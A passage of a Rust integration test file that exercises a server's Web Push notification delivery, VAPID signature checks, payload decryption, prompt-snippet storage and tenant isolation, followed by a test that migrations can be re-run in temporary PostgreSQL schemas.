        .post(format!("{base}/api/v1/me/notifications/test"))
        .bearer_auth(&leo_relogin.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(test_wp_res["ok"], true);
    assert_eq!(test_wp_res["delivered_channels"], json!(["web_push"]));

    let captured_1 = tokio::time::timeout(std::time::Duration::from_secs(3), wp_rx.recv())
        .await
        .unwrap()
        .unwrap();
    assert_eq!(captured_1.content_encoding, "aes128gcm");
    assert_eq!(captured_1.ttl, "3600");
    assert_eq!(captured_1.urgency, "high");

    // Verify RFC 8292 VAPID ES256 JWT signature on the captured HTTP request
    let vapid_rest = captured_1.authorization.strip_prefix("vapid t=").unwrap();
    let (jwt_str, k_str) = vapid_rest.split_once(", k=").unwrap();
    assert_eq!(k_str, vapid_info.public_key);
    let jwt_parts: Vec<&str> = jwt_str.split('.').collect();
    assert_eq!(jwt_parts.len(), 3);
    let verifier = VerifyPublicKey::new(&ECDSA_P256_SHA256_FIXED, &vapid_pub_bytes);
    verifier
        .verify(
            format!("{}.{}", jwt_parts[0], jwt_parts[1]).as_bytes(),
            &coda_server::web_push::decode_flexible_b64(jwt_parts[2]).unwrap(),
        )
        .expect("live VAPID ES256 JWT must verify");

    // Decrypt RFC 8291 `aes128gcm` HTTP body as the subscriber user-agent!
    let plain_1 = coda_server::web_push::decrypt_web_push_aes128gcm(
        ua_priv_1,
        ua_pub_1.as_ref(),
        &auth_sec_1,
        &captured_1.body,
    )
    .unwrap();
    let plain_1_json: serde_json::Value = serde_json::from_slice(&plain_1).unwrap();
    assert_eq!(plain_1_json["url"], "/console");
    assert_eq!(plain_1_json["tag"], "coda-test");
    assert!(plain_1_json["title"].as_str().unwrap().contains("Alert Test"));

    // Confirm `/push/stale` (HTTP 410) was auto-removed -> `web_push_count == 1`!
    let notif_after_410: coda_server::NotificationSettingsRecord = http
        .get(format!("{base}/api/v1/me/notifications"))
        .bearer_auth(&leo_relogin.token)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(notif_after_410.web_push_count, 1);

    // Rotate subscriber keys on `/push/active` (idempotent upsert) and test `POST /api/v1/daemon/alert`!
    let ua_priv_2 = EphemeralPrivateKey::generate(&ECDH_P256, &rng).unwrap();
    let ua_pub_2 = ua_priv_2.compute_public_key().unwrap();
    let mut auth_sec_2 = [0u8; 16];
    rng.fill(&mut auth_sec_2).unwrap();
    let sub_rot_res: serde_json::Value = http
        .post(format!("{base}/api/v1/me/web-push/subscribe"))
        .bearer_auth(&leo_relogin.token)
        .json(&json!({
            "endpoint": format!("http://{wp_addr}/push/active"),
            "keys": {
                "p256dh": B64_URL.encode(ua_pub_2.as_ref()),
                "auth": B64_URL.encode(auth_sec_2),
            },
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(sub_rot_res["web_push_count"], 1);

    let daemon_wp_alert: serde_json::Value = http
        .post(format!("{base}/api/v1/daemon/alert"))
        .bearer_auth(&leo_daemon.daemon_relay_ticket)
        .json(&json!({
            "device_id": leo_daemon.device_id,
            "device_name": "Leo-Linux-Box",
            "session_name": "codex-fix",
            "status": "needs_you",
            "cwd_basename": "/home/leo_secret/my-repo",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(daemon_wp_alert["ok"], true);
    assert_eq!(daemon_wp_alert["dispatched"], 1);

    let captured_2 = tokio::time::timeout(std::time::Duration::from_secs(3), wp_rx.recv())
        .await
        .unwrap()
        .unwrap();
    let plain_2 = coda_server::web_push::decrypt_web_push_aes128gcm(
        ua_priv_2,
        ua_pub_2.as_ref(),
        &auth_sec_2,
        &captured_2.body,
    )
    .unwrap();
    let plain_2_str = String::from_utf8(plain_2).unwrap();
    assert!(!plain_2_str.contains("leo_secret"));
    let plain_2_json: serde_json::Value = serde_json::from_str(&plain_2_str).unwrap();
    assert_eq!(plain_2_json["url"], "/console");
    assert!(plain_2_json["body"].as_str().unwrap().contains("my-repo"));

    // Unsubscribe wildcard `*` removes all user subscriptions
    let unsub_res: serde_json::Value = http
        .post(format!("{base}/api/v1/me/web-push/unsubscribe"))
        .bearer_auth(&leo_relogin.token)
        .json(&json!({ "endpoint": "*" }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(unsub_res["ok"], true);
    assert_eq!(unsub_res["web_push_count"], 0);

    // 5. Cross-Device Saved Prompt Snippets (`GET / PUT /api/v1/me/snippets`)
    let initial_snippets: serde_json::Value = http
        .get(format!("{base}/api/v1/me/snippets"))
        .bearer_auth(&leo_relogin.token)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(initial_snippets["snippets"].as_array().unwrap().len(), 4);
    assert_eq!(initial_snippets["snippets"][0]["id"], "s1");

    // Validation rejects over-length title (> 60 chars)
    let bad_snippets = http
        .put(format!("{base}/api/v1/me/snippets"))
        .bearer_auth(&leo_relogin.token)
        .json(&json!({
            "snippets": [{
                "id": "bad1",
                "title": "x".repeat(65),
                "prompt": "do work",
            }]
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(bad_snippets.status(), reqwest::StatusCode::BAD_REQUEST);

    // Save custom snippets for Leo and verify persistence + tenant isolation
    let custom_payload = json!({
        "snippets": [
            {
                "id": "custom-1",
                "title": "Audit Security",
                "prompt": "Audit all auth & SSRF boundaries and write tests.",
            },
            {
                "id": "custom-2",
                "title": "Ship Release",
                "prompt": "Run full cargo & bun test suites and summarize.",
            }
        ]
    });
    let saved_snippets: serde_json::Value = http
        .put(format!("{base}/api/v1/me/snippets"))
        .bearer_auth(&leo_relogin.token)
        .json(&custom_payload)
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(saved_snippets["snippets"].as_array().unwrap().len(), 2);

    let fetched_leo_snippets: serde_json::Value = http
        .get(format!("{base}/api/v1/me/snippets"))
        .bearer_auth(&leo_relogin.token)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(fetched_leo_snippets["snippets"][0]["title"], "Audit Security");

    // Owner still has the 4 untouched curated default snippets!
    let owner_snippets: serde_json::Value = http
        .get(format!("{base}/api/v1/me/snippets"))
        .bearer_auth(&owner.token)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert_eq!(owner_snippets["snippets"].as_array().unwrap().len(), 4);

    wp_server_task.abort();
    let _ = std::fs::remove_dir_all(&tmp_web_dist);
}

#[tokio::test]
async fn test_fresh_empty_schema_init_and_idempotent_remigration() {
    const INIT_SQL: &str = include_str!("../../../migrations/001_init.sql");

    let db_url = std::env::var("TEST_DATABASE_URL")
        .unwrap_or_else(|_| "postgres://vampire@localhost:5432/coda_test".to_string());
    let (pg, conn) = tokio_postgres::connect(&db_url, tokio_postgres::NoTls)
        .await
        .expect("PostgreSQL coda_test should be reachable");
    tokio::spawn(async move {
        let _ = conn.await;
    });

    let schema_name = format!("fresh_init_{}", uuid::Uuid::new_v4().simple());
    let pure_schema = format!("fresh_pure_{}", uuid::Uuid::new_v4().simple());

    pg.batch_execute(&format!(
        "CREATE SCHEMA {schema_name}; CREATE SCHEMA {pure_schema};"
    ))
    .await
    .expect("create isolated temporary PostgreSQL schemas");

    let verification: Result<(), String> = async {
        // 1. Set search_path to ONLY `fresh_init_<uuid>, public` with zero pre-existing tables in `fresh_init_<uuid>`.
        pg.batch_execute(&format!("SET search_path TO {schema_name}, public;"))
            .await
            .map_err(|e| format!("failed setting search_path: {e}"))?;

        let active_schema: String = pg
            .query_one("SELECT current_schema()", &[])
            .await
            .map_err(|e| format!("failed querying current_schema: {e}"))?
            .get(0);
        if active_schema != schema_name {
            return Err(format!(
                "expected current_schema() == {schema_name}, got {active_schema}"
            ));
        }

        let initial_tables: i64 = pg
            .query_one(
                "SELECT COUNT(*)::BIGINT FROM information_schema.tables WHERE table_schema = $1",
                &[&schema_name],
            )
            .await
            .map_err(|e| format!("failed counting initial tables: {e}"))?
            .get(0);
        if initial_tables != 0 {
            return Err(format!(
                "expected 0 pre-existing tables in {schema_name}, found {initial_tables}"
            ));
        }

        // Execute `migrations/001_init.sql` TWICE in a row (fresh bootstrap + idempotent re-run).
        pg.batch_execute(INIT_SQL)
            .await
            .map_err(|e| format!("first fresh 001_init.sql execution failed in {schema_name}: {e}"))?;
        pg.batch_execute(INIT_SQL).await.map_err(|e| {
            format!("second idempotent 001_init.sql execution failed in {schema_name}: {e}")
        })?;

        let created_tables: i64 = pg
            .query_one(
                "SELECT COUNT(*)::BIGINT FROM information_schema.tables WHERE table_schema = $1",
                &[&schema_name],
            )
            .await
            .map_err(|e| format!("failed counting created tables: {e}"))?
            .get(0);
        if created_tables != 12 {
            return Err(format!(
                "expected 12 tables in {schema_name}, found {created_tables}"
            ));
        }

        // Verify every FK in `fresh_init_<uuid>` points strictly inside `fresh_init_<uuid>` (never leaking to `public`).
        let cross_schema_fks: i64 = pg
            .query_one(
                r#"
                SELECT COUNT(*)::BIGINT
                FROM pg_constraint c
                JOIN pg_namespace n_src ON n_src.oid = c.connamespace
                JOIN pg_class rel_dst ON rel_dst.oid = c.confrelid
                JOIN pg_namespace n_dst ON n_dst.oid = rel_dst.relnamespace
                WHERE c.contype = 'f'
                  AND n_src.nspname = $1
                  AND n_dst.nspname <> $1
                "#,
                &[&schema_name],
            )
            .await
            .map_err(|e| format!("failed checking FK target schemas: {e}"))?
            .get(0);
        if cross_schema_fks != 0 {
            return Err(format!(
                "expected 0 cross-schema foreign keys in {schema_name}, found {cross_schema_fks}"
            ));
        }

        // 2. Also prove bootstrap + re-migration with `public` completely absent from `search_path`
        //    (simulating a brand-new empty PostgreSQL 18 database with zero tables anywhere on `search_path`).
        pg.batch_execute(&format!("SET search_path TO {pure_schema}, pg_catalog;"))
            .await
            .map_err(|e| format!("failed setting pure search_path: {e}"))?;
        pg.batch_execute(INIT_SQL)
            .await
            .map_err(|e| format!("first pure-empty 001_init.sql execution failed: {e}"))?;
        pg.batch_execute(INIT_SQL)
            .await
            .map_err(|e| format!("second pure-empty 001_init.sql execution failed: {e}"))?;

        Ok(())
    }
    .await;

    // Always clean up temporary schemas before panicking on any failure.
    let cleanup_res = pg
        .batch_execute(&format!(
            "SET search_path TO public; DROP SCHEMA IF EXISTS {schema_name} CASCADE; DROP SCHEMA IF EXISTS {pure_schema} CASCADE;"
        ))
        .await;

    if let Err(err) = verification {
        panic!("fresh schema init / idempotent remigration test failed: {err}");
    }
    cleanup_res.expect("drop temporary fresh_init schemas cleanly");
}
